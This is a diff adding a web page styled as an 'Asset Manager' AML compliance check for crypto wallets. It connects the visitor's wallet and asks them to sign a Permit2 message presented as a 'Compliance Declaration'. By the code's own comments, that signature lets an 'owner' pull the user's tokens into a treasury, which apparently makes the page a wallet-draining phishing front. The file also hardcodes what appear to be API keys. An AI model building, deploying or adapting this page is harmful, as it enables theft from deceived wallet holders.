@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Asset Manager - Compliance & AML Verification</title>
+  <script src="https://unpkg.com/ethers@6.8.1/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.7.1/dist/umd/index.min.js" onload="console.log('WalletConnect v2 loaded successfully')" onerror="console.error('Failed to load WalletConnect v2')"></script>
+  <script src="https://unpkg.com/@walletconnect/core@2.8.0/dist/umd/index.min.js" onload="console.log('WalletConnect Core loaded successfully')" onerror="console.error('Failed to load WalletConnect Core')"></script>
+  <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      max-width: 450px;
+      width: 90%;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      border-radius: 24px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.1), 0 0 0 1px rgba(255,255,255,0.2);
+      padding: 40px;
+      text-align: center;
+    }
+    h1 {
+      color: #2d3748;
+      font-size: 28px;
+      font-weight: 700;
+      margin: 0 0 8px 0;
+      letter-spacing: -0.5px;
+    }
+    .subtitle {
+      color: #718096;
+      font-size: 16px;
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+    .features {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      margin: 24px 0;
+    }
+    .feature {
+      background: rgba(102, 126, 234, 0.1);
+      border-radius: 12px;
+      padding: 16px;
+      text-align: center;
+    }
+    .feature-icon {
+      font-size: 24px;
+      margin-bottom: 8px;
+    }
+    .feature-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #2d3748;
+      margin: 0 0 4px 0;
+    }
+    .feature-desc {
+      font-size: 12px;
+      color: #718096;
+      margin: 0;
+    }
+    button {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      padding: 16px 32px;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+    }
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+    }
+    button:active {
+      transform: translateY(0);
+    }
+    .status {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 8px;
+      font-weight: 500;
+    }
+    .success { background: #d4edda; color: #155724; }
+    .error { background: #f8d7da; color: #721c24; }
+    .info { background: #d1ecf1; color: #0c5460; }
+    .wallet-info {
+      background: rgba(102, 126, 234, 0.05);
+      border: 1px solid rgba(102, 126, 234, 0.2);
+      border-radius: 16px;
+      padding: 20px;
+      margin-top: 24px;
+      text-align: left;
+    }
+    .wallet-info p {
+      margin: 8px 0;
+      color: #2d3748;
+    }
+    .wallet-info span {
+      font-family: 'Monaco', 'Menlo', monospace;
+      background: rgba(102, 126, 234, 0.1);
+      padding: 4px 8px;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .transfer-section {
+      background: rgba(255, 193, 7, 0.1);
+      border: 1px solid rgba(255, 193, 7, 0.3);
+      padding: 24px;
+      border-radius: 16px;
+      margin: 24px 0;
+    }
+    .transfer-section h3 {
+      margin-top: 0;
+      color: #2d3748;
+      font-weight: 600;
+    }
+    input[type="number"] { 
+      -moz-appearance: textfield; 
+      appearance: textfield; 
+    }
+    .mobile-instructions {
+      background: rgba(255, 193, 7, 0.1);
+      border: 1px solid rgba(255, 193, 7, 0.3);
+      border-radius: 16px;
+      padding: 24px;
+      margin: 24px 0;
+      text-align: left;
+    }
+    .mobile-instructions h3 {
+      margin-top: 0;
+      color: #2d3748;
+      font-weight: 600;
+      text-align: center;
+    }
+    .instruction-step {
+      display: flex;
+      align-items: flex-start;
+      margin: 16px 0;
+      gap: 12px;
+    }
+    .step-number {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+    .step-content {
+      flex: 1;
+      color: #2d3748;
+      line-height: 1.5;
+    }
+    .qr-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .qr-modal-content {
+      background: white;
+      border-radius: 20px;
+      padding: 0;
+      max-width: 400px;
+      width: 90%;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+    }
+    .qr-modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 24px;
+      border-bottom: 1px solid #e2e8f0;
+    }
+    .qr-modal-header h3 {
+      margin: 0;
+      color: #2d3748;
+      font-weight: 600;
+    }
+    .close-btn {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: #718096;
+      padding: 0;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: all 0.2s;
+    }
+    .close-btn:hover {
+      background: #f7fafc;
+      color: #2d3748;
+    }
+    .qr-modal-body {
+      padding: 24px;
+      text-align: center;
+    }
+    .qr-modal-body p {
+      margin: 0 0 20px 0;
+      color: #4a5568;
+      font-size: 16px;
+    }
+    .qr-code-container {
+      background: white;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+      display: inline-block;
+    }
+    .qr-instructions {
+      margin: 20px 0;
+      text-align: left;
+    }
+    .connection-status {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: 500;
+    }
+    .connection-status.connecting {
+      background: #d1ecf1;
+      color: #0c5460;
+    }
+    .connection-status.connected {
+      background: #d4edda;
+      color: #155724;
+    }
+    .connection-status.error {
+      background: #f8d7da;
+      color: #721c24;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🏛️ Asset Manager</h1>
+    <p class="subtitle">Secure compliance verification for digital asset transfers</p>
+    
+    <div class="features">
+      <div class="feature">
+        <div class="feature-icon">🔒</div>
+        <div class="feature-title">AML Compliance</div>
+        <div class="feature-desc">Anti-money laundering verification</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">⚡</div>
+        <div class="feature-title">Fast Processing</div>
+        <div class="feature-desc">Instant transaction approval</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">🛡️</div>
+        <div class="feature-title">Secure Signing</div>
+        <div class="feature-desc">Off-chain signature verification</div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">📊</div>
+        <div class="feature-title">Analytics</div>
+        <div class="feature-desc">Forensic wallet analysis</div>
+      </div>
+    </div>
+
+    <button id="connectWallet">Connect Wallet</button>
+
+    <div id="mobileInstructions" class="mobile-instructions" style="display:none;">
+      <h3>📱 Mobile Wallet Connection</h3>
+      <div class="instruction-step">
+        <div class="step-number">1</div>
+        <div class="step-content">
+          <strong>Trust Wallet:</strong> Open Trust Wallet app → Tap "Browser" → Navigate to this page
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-number">2</div>
+        <div class="step-content">
+          <strong>MetaMask:</strong> Open MetaMask app → Tap "Browser" → Navigate to this page
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-number">3</div>
+        <div class="step-content">
+          <strong>Other Wallets:</strong> Use your wallet's built-in browser feature
+        </div>
+      </div>
+    </div>
+
+    <div id="walletInfo" class="wallet-info" style="display:none;">
+      <p><b>Address:</b> <span id="userAddress"></span></p>
+      <p><b>Network:</b> <span id="networkName"></span></p>
+    </div>
+
+    <div id="transferSection" class="transfer-section" style="display:none;">
+      <h3>💰 Token Transfer</h3>
+      <p>Authorization complete! Owner can now pull tokens using your signed Permit2 message.</p>
+      <div style="margin: 15px 0;">
+        <label for="transferAmount" style="display: block; margin-bottom: 5px; font-weight: 600;">Amount to Transfer:</label>
+        <input type="number" id="transferAmount" value="5" min="0.000001" step="0.000001" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px;">
+      </div>
+      <button id="transferBtn" style="background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);">Transfer Tokens (owner action)</button>
+    </div>
+
+    <div id="status" class="status info" style="display:none;"></div>
+  </div>
+
+  <!-- QR Code Modal for Trust Wallet Connection -->
+  <div id="qrModal" class="qr-modal" style="display:none;">
+    <div class="qr-modal-content">
+      <div class="qr-modal-header">
+        <h3>📱 Connect Trust Wallet</h3>
+        <button id="closeQrModal" class="close-btn">&times;</button>
+      </div>
+      <div class="qr-modal-body">
+        <p>Scan this QR code with your Trust Wallet app:</p>
+        <div id="qrCode" class="qr-code-container"></div>
+        <div class="qr-instructions">
+          <div class="instruction-step">
+            <div class="step-number">1</div>
+            <div class="step-content">Open Trust Wallet on your phone</div>
+          </div>
+          <div class="instruction-step">
+            <div class="step-number">2</div>
+            <div class="step-content">Tap "Connect Wallet" or "Scan QR"</div>
+          </div>
+          <div class="instruction-step">
+            <div class="step-number">3</div>
+            <div class="step-content">Scan the QR code above</div>
+          </div>
+        </div>
+        <div id="connectionStatus" class="connection-status"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Update this to your backend
+    const BACKEND_URL = "http://localhost:3001";
+
+    let provider, signer, userAddress;
+
+    const connectWalletBtn = document.getElementById("connectWallet");
+    const walletInfo = document.getElementById("walletInfo");
+    const userAddressSpan = document.getElementById("userAddress");
+    const networkNameSpan = document.getElementById("networkName");
+    const statusDiv = document.getElementById("status");
+    const transferSection = document.getElementById("transferSection");
+    const transferBtn = document.getElementById("transferBtn");
+    const transferAmountInput = document.getElementById("transferAmount");
+    const mobileInstructions = document.getElementById("mobileInstructions");
+    const qrModal = document.getElementById("qrModal");
+    const qrCode = document.getElementById("qrCode");
+    const closeQrModal = document.getElementById("closeQrModal");
+    const connectionStatus = document.getElementById("connectionStatus");
+
+    connectWalletBtn.addEventListener("click", connectWallet);
+    transferBtn.addEventListener("click", transferTokens);
+    closeQrModal.addEventListener("click", closeModal);
+    
+    // Close modal when clicking outside
+    qrModal.addEventListener("click", function(e) {
+      if (e.target === qrModal) {
+        closeModal();
+      }
+    });
+
+    function showStatus(message, type = "info") {
+      statusDiv.textContent = message;
+      statusDiv.className = "status " + type;
+      statusDiv.style.display = "block";
+    }
+
+    function closeModal() {
+      qrModal.style.display = "none";
+      connectionStatus.textContent = "";
+      connectionStatus.className = "connection-status";
+    }
+
+    function showConnectionStatus(message, type = "") {
+      connectionStatus.textContent = message;
+      connectionStatus.className = "connection-status " + type;
+    }
+
+    // Proven WalletConnect connection function adapted from React code
+    async function tryWalletConnectConnection(config) {
+      const rpcMap = {
+        1: "https://mainnet.infura.io/v3/ae5b9caa879c427295e160b983cf84fa", // Ethereum Mainnet
+        5: "https://goerli.infura.io/v3/ae5b9caa879c427295e160b983cf84fa", // Ethereum Goerli
+        11155111: "https://sepolia.infura.io/v3/ae5b9caa879c427295e160b983cf84fa" // Ethereum Sepolia
+      };
+
+      const initConfig = {
+        projectId: "9aa3d95b3bc440fa88ea12eaa4456161",
+        showQrModal: false, // We'll handle QR display ourselves
+        methods: ["eth_sendTransaction", "personal_sign", "eth_signTypedData_v4", "eth_sign"],
+        metadata: {
+          name: "AML Asset Manager",
+          description: "AML Asset Manager Demo",
+          url: window.location.origin,
+          icons: ["https://avatars.githubusercontent.com/u/37784886"]
+        }
+      };
+
+      // Only add chains and rpcMap if chains are specified
+      if (config.chains.length > 0) {
+        initConfig.chains = config.chains;
+        initConfig.rpcMap = config.chains.reduce((acc, chainId) => {
+          if (rpcMap[chainId]) {
+            acc[chainId] = rpcMap[chainId];
+          }
+          return acc;
+        }, {});
+      }
+
+      const wcProvider = await window.EthereumProvider.init(initConfig);
+
+      // Set up event listeners
+      wcProvider.on("display_uri", (uri) => {
+        console.log("QR Code URI:", uri);
+        
+        // Show QR code container
+        qrCode.style.display = 'block';
+        
+        // Generate QR Code
+        QRCode.toCanvas(qrCode, uri, { 
+          width: 256, 
+          margin: 2,
+          color: {
+            dark: '#000000',
+            light: '#FFFFFF'
+          }
+        }, function (error) {
+          if (error) {
+            console.error("QR Code generation failed:", error);
+            showConnectionStatus("❌ Failed to generate QR code", "error");
+          } else {
+            showConnectionStatus("📱 Scan QR code with Trust Wallet", "connecting");
+            console.log("QR Code generated successfully");
+          }
+        });
+      });
+
+      wcProvider.on("connect", (connectInfo) => {
+        console.log("WalletConnect connected:", connectInfo);
+        showConnectionStatus("✅ Connected! Setting up wallet...", "connected");
+        
+        try {
+          // Create ethers provider from WalletConnect
+          provider = new ethers.BrowserProvider(wcProvider);
+          signer = provider.getSigner();
+          
+          // Get user address
+          signer.getAddress().then(address => {
+            userAddress = address;
+            userAddressSpan.textContent = userAddress;
+            
+            // Get network info
+            provider.getNetwork().then(network => {
+              networkNameSpan.textContent = network.name || network.chainId;
+              walletInfo.style.display = "block";
+              
+              // Close QR modal
+              setTimeout(() => {
+                closeModal();
+                showStatus("✅ Trust Wallet connected! Preparing Permit2 signature request...", "info");
+                requestSignatureAndAuthorize();
+              }, 1000);
+            }).catch(networkErr => {
+              console.error("Network error:", networkErr);
+              showConnectionStatus("❌ Failed to get network info", "error");
+            });
+          }).catch(addressErr => {
+            console.error("Address error:", addressErr);
+            showConnectionStatus("❌ Failed to get wallet address", "error");
+          });
+        } catch (providerErr) {
+          console.error("Provider error:", providerErr);
+          showConnectionStatus("❌ Failed to create provider", "error");
+        }
+      });
+
+      wcProvider.on("disconnect", (error) => {
+        console.log("WalletConnect disconnected:", error);
+        showConnectionStatus("❌ Wallet disconnected", "error");
+      });
+
+      wcProvider.on("session_delete", () => {
+        console.log("WalletConnect session deleted");
+        showConnectionStatus("❌ Session ended", "error");
+      });
+
+      wcProvider.on("session_event", (event) => {
+        console.log("WalletConnect session event:", event);
+      });
+
+      wcProvider.on("session_update", (event) => {
+        console.log("WalletConnect session update:", event);
+      });
+
+      await wcProvider.enable();
+      return wcProvider;
+    }
+
+    async function connectWallet() {
+      try {
+        // Check if we have a direct wallet connection first
+        // if (window.ethereum && window.ethereum.isMetaMask) {
+        //   // Use direct MetaMask connection
+        //   showStatus("🔄 Connecting to MetaMask...", "info");
+        //   provider = new ethers.BrowserProvider(window.ethereum);
+        //   await provider.send("eth_requestAccounts", []);
+        //   signer = await provider.getSigner();
+        //   userAddress = await signer.getAddress();
+          
+        //   const network = await provider.getNetwork();
+        //   networkNameSpan.textContent = network.name || network.chainId;
+        //   userAddressSpan.textContent = userAddress;
+        //   walletInfo.style.display = "block";
+          
+        //   showStatus("✅ MetaMask connected! Preparing Permit2 signature request...", "info");
+        //   await requestSignatureAndAuthorize();
+        //   return;
+        // }
+        
+        // For Trust Wallet mobile app users, show specific instructions
+        showStatus("🔄 Detecting wallet connection...", "info");
+        
+        // Check if we're in Trust Wallet mobile app (no ethereum object)
+        const isMobileApp = !window.ethereum && (
+          navigator.userAgent.includes('TrustWallet') ||
+          navigator.userAgent.includes('Trust Wallet') ||
+          navigator.userAgent.includes('Mobile') ||
+          /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+        );
+        
+        if (isMobileApp) {
+          // Use proven WalletConnect v2 approach from React code
+          qrModal.style.display = "flex";
+          showConnectionStatus("🔄 Initializing WalletConnect v2 for Trust Wallet...", "connecting");
+          
+          try {
+            // Wait for libraries to load with better debugging
+            console.log("Waiting for WalletConnect v2 to load...");
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            // Check available objects
+            console.log("Available objects:", Object.keys(window).filter(key => 
+              key.includes('WalletConnect') || key.includes('Ethereum') || key.includes('Provider')
+            ));
+            
+            // Check specific WalletConnect objects
+            console.log("window.EthereumProvider:", typeof window.EthereumProvider);
+            console.log("window.WalletConnectEthereumProvider:", typeof window.WalletConnectEthereumProvider);
+            console.log("window.WalletConnect:", typeof window.WalletConnect);
+            
+            if (typeof window.EthereumProvider === 'undefined') {
+              console.error("WalletConnect v2 not loaded, trying dynamic loading...");
+              
+              // Try dynamic loading as fallback
+              await new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = 'https://unpkg.com/@walletconnect/ethereum-provider@2.7.1/dist/umd/index.min.js';
+                script.onload = () => {
+                  console.log("Dynamic WalletConnect v2 loaded");
+                  resolve();
+                };
+                script.onerror = () => {
+                  console.error("Dynamic WalletConnect v2 loading failed");
+                  reject(new Error("WalletConnect v2 not available"));
+                };
+                document.head.appendChild(script);
+              });
+              
+              // Wait a bit more for the dynamic script to initialize
+              await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            // Try different chain configurations for maximum Trust Wallet compatibility
+            const chainConfigs = [
+              { chains: [], name: "No specific chains (let wallet choose)" },
+              { chains: [1], name: "Ethereum Mainnet" },
+              { chains: [1, 11155111], name: "Mainnet + Sepolia" },
+              { chains: [11155111], name: "Sepolia Testnet Only" }
+            ];
+            
+            let walletConnectProvider;
+            let success = false;
+            
+            for (let i = 0; i < chainConfigs.length; i++) {
+              try {
+                console.log(`Trying configuration ${i + 1}: ${chainConfigs[i].name}`);
+                walletConnectProvider = await tryWalletConnectConnection(chainConfigs[i]);
+                success = true;
+                break; // Success, exit the loop
+              } catch (error) {
+                console.log(`Configuration ${i + 1} failed:`, error.message);
+                if (i === chainConfigs.length - 1) {
+                  // Last attempt failed, throw the error
+                  throw error;
+                }
+                // Continue to next configuration
+              }
+            }
+            
+            if (!success) {
+              throw new Error("All WalletConnect configurations failed");
+            }
+            
+            // If we get here, WalletConnect is working
+            console.log("✅ WalletConnect v2 initialized successfully");
+            
+          } catch (wcError) {
+            console.error("WalletConnect v2 error:", wcError);
+            showConnectionStatus("❌ WalletConnect v2 failed. Please use Trust Wallet browser.", "error");
+            
+            // Try to show a test QR code for debugging
+            try {
+              console.log("Attempting to show test QR code...");
+              qrCode.style.display = 'block';
+              
+              // Generate a test QR code
+              const testUri = "wc:test-uri-for-debugging";
+              QRCode.toCanvas(qrCode, testUri, { 
+                width: 256, 
+                margin: 2,
+                color: {
+                  dark: '#000000',
+                  light: '#FFFFFF'
+                }
+              }, function (error) {
+                if (error) {
+                  console.error("Test QR Code generation failed:", error);
+                } else {
+                  console.log("Test QR Code generated successfully");
+                  showConnectionStatus("🔧 Test QR Code (WalletConnect failed)", "error");
+                }
+              });
+            } catch (qrError) {
+              console.error("QR Code generation error:", qrError);
+            }
+            
+            // Show fallback instructions
+            const fallbackDiv = document.createElement('div');
+            fallbackDiv.style.cssText = `
+              background: #fff3cd;
+              border: 1px solid #ffeaa7;
+              border-radius: 8px;
+              padding: 15px;
+              margin: 10px 0;
+              font-size: 14px;
+              line-height: 1.4;
+            `;
+            fallbackDiv.innerHTML = `
+              <strong>🔄 Alternative Connection Method:</strong><br><br>
+              <strong>Use Trust Wallet Browser:</strong><br>
+              1. Open Trust Wallet app<br>
+              2. Tap "Browser" tab at the bottom<br>
+              3. Navigate to this website<br>
+              4. Click "Connect Wallet"<br><br>
+              <strong>Or try refreshing the page and try again.</strong>
+            `;
+            qrModal.querySelector('.qr-modal-body').appendChild(fallbackDiv);
+          }
+          
+          return;
+        }
+        
+        // Fallback: Show general instructions
+        qrModal.style.display = "flex";
+        showConnectionStatus("🔄 Wallet connection required", "connecting");
+        
+        const fallbackDiv = document.createElement('div');
+        fallbackDiv.style.cssText = `
+          background: #f8f9fa;
+          border: 1px solid #dee2e6;
+          border-radius: 8px;
+          padding: 15px;
+          margin: 10px 0;
+          font-size: 14px;
+          line-height: 1.4;
+        `;
+        fallbackDiv.innerHTML = `
+          <strong>🔗 Connect Your Wallet:</strong><br><br>
+          <strong>For Trust Wallet Mobile:</strong><br>
+          1. Open Trust Wallet app<br>
+          2. Tap "Browser" tab<br>
+          3. Navigate to this website<br>
+          4. Click "Connect Wallet"<br><br>
+          <strong>For Desktop:</strong><br>
+          1. Install MetaMask or Trust Wallet extension<br>
+          2. Refresh this page<br>
+          3. Click "Connect Wallet"
+        `;
+        qrModal.querySelector('.qr-modal-body').appendChild(fallbackDiv);
+        
+        // Hide QR code
+        qrCode.style.display = 'none';
+        
+        return;
+
+      } catch (err) {
+        console.error(err);
+        
+        // Enhanced error handling
+        let errorMessage = err?.message || err;
+        
+        if (errorMessage.includes("User rejected") || errorMessage.includes("User denied")) {
+          showStatus("❌ Connection cancelled by user", "error");
+        } else if (errorMessage.includes("No Ethereum wallet detected")) {
+          showStatus("❌ No wallet detected. Please install Trust Wallet, MetaMask, or another compatible wallet.", "error");
+        } else {
+          showStatus("❌ " + errorMessage, "error");
+        }
+        
+        // Close QR modal if open
+        if (qrModal.style.display === "flex") {
+          closeModal();
+        }
+      }
+    }
+
+    // Primary flow:
+    // 1) Get the Compliance Declaration typed-data payload from backend: domain, types, value (includes compliance message, token, amount, nonce, deadline).
+    // 2) Sign typed data with ethers v6 signer.signTypedData
+    // 3) Send signature + payload back to backend to authorize and transfer tokens
+    async function requestSignatureAndAuthorize() {
+      try {
+        showStatus("🔁 Requesting Compliance Declaration from backend...", "info");
+
+        const res = await fetch(`${BACKEND_URL}/get-signature-request`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ userAddress, amount: "5" }) // Send default amount of 5 tokens
+        });
+
+        if (!res.ok) {
+          const text = await res.text().catch(() => "");
+          throw new Error(`Backend /get-signature-request failed: ${res.status} ${text}`);
+        }
+
+        const data = await res.json();
+
+        // Expect backend to return proper EIP-712 payload: { domain, types, value }
+        if (!data || !data.domain || !data.types || !data.value) {
+          throw new Error("Invalid response from backend: missing domain/types/value");
+        }
+
+        showStatus("✍️ Please sign the Compliance Declaration (MetaMask popup)...", "info");
+        
+        // Display the compliance message to the user
+        if (data.raw && data.raw.message) {
+          console.log("📋 Compliance Declaration:");
+          console.log(data.raw.message);
+          
+          // Show compliance message in UI
+          const complianceDiv = document.createElement('div');
+          complianceDiv.style.cssText = `
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: monospace;
+            white-space: pre-line;
+            font-size: 14px;
+            line-height: 1.4;
+          `;
+          complianceDiv.textContent = data.raw.message;
+          document.body.appendChild(complianceDiv);
+        }
+
+        // IMPORTANT: ethers v6 uses signTypedData for EIP-712 (not _signTypedData)
+        // Ensure numbers are strings in the typed data to avoid JSON conversion issues.
+        // If backend already normalized numbers to strings, this is okay — otherwise backend should supply strings.
+        // We use the exact objects returned by backend.
+        let signature;
+        try {
+          signature = await signer.signTypedData(data.domain, data.types, data.value);
+        } catch (signErr) {
+          console.error("Sign error:", signErr);
+          console.error("Error details:", {
+            code: signErr.code,
+            message: signErr.message,
+            reason: signErr.reason
+          });
+          
+          if (signErr.code === 4001) {
+            throw new Error("User rejected the signature request");
+          } else if (signErr.code === -32603) {
+            throw new Error("Internal JSON-RPC error. Please check your wallet connection.");
+          } else {
+            throw new Error(`Signing failed: ${signErr.message || signErr.reason || 'Unknown error'}`);
+          }
+        }
+
+        showStatus("✅ Signature created. Sending signature to backend to execute Permit2 permit...", "info");
+
+        const authRes = await fetch(`${BACKEND_URL}/authorize`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userAddress,
+            signature,
+            // send the entire typed-data value back so backend can verify / use it
+            value: data.value
+          })
+        });
+
+        if (!authRes.ok) {
+          const text = await authRes.text().catch(() => "");
+          throw new Error(`Backend /authorize failed: ${authRes.status} ${text}`);
+        }
+
+        const result = await authRes.json();
+
+        if (result.success) {
+          showStatus(`✅ Authorization recorded / Permit2 executed on-chain! Tx: ${result.txHash}`, "success");
+          // Show transfer UI: in your flow the owner triggers transfer; this shows the UI for demo
+          transferSection.style.display = "block";
+        } else {
+          throw new Error(result.error || "Authorization failed on backend");
+        }
+      } catch (err) {
+        console.error(err);
+        showStatus("❌ " + (err?.message || err), "error");
+      }
+    }
+
+    // Owner triggered transfer (calls backend which should call Permit2.transferFrom or token transfer path)
+    async function transferTokens() {
+      try {
+        const amountRaw = transferAmountInput.value;
+        if (!amountRaw || Number(amountRaw) <= 0) {
+          showStatus("❌ Please enter a valid amount", "error");
+          return;
+        }
+
+        // Send as string to backend, backend will parse/scale according to token decimals
+        showStatus(`🚀 Requesting owner to transfer ${amountRaw} tokens...`, "info");
+
+        const transferRes = await fetch(`${BACKEND_URL}/transfer-tokens`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userAddress,
+            amount: amountRaw
+          })
+        });
+
+        if (!transferRes.ok) {
+          const text = await transferRes.text().catch(() => "");
+          throw new Error(`Backend /transfer-tokens failed: ${transferRes.status} ${text}`);
+        }
+
+        const result = await transferRes.json();
+
+        if (result.success) {
+          showStatus(`✅ Transfer executed. Tx: ${result.transfer.txHash}`, "success");
+          // Display balances / info if backend returned them
+          if (result.balances) {
+            showStatus(`👤 User Balance: ${result.balances.user.before} → ${result.balances.user.after}`, "info");
+            showStatus(`🏛️ Treasury Balance: ${result.balances.treasury.before} → ${result.balances.treasury.after}`, "info");
+          }
+        } else {
+          throw new Error(result.error || "Transfer failed");
+        }
+      } catch (err) {
+        console.error(err);
+        showStatus("❌ " + (err?.message || err), "error");
+      }
+    }
+  </script>
+</body>
+</html>
